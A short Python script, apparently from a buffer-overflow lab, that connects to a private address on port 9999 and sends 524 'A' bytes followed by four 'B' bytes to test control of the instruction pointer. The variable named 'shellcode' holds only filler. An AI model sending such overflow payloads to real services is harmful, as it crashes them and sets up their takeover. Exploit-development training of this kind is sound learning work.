#!/usr/bin/python
import sys, socket
from time import sleep

shellcode = "A" * 524 + "B" * 4

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.88.14',9999))
	s.send((shellcode))
	s.close()
except:
	print("Error connecting to server")
	sys.exit()
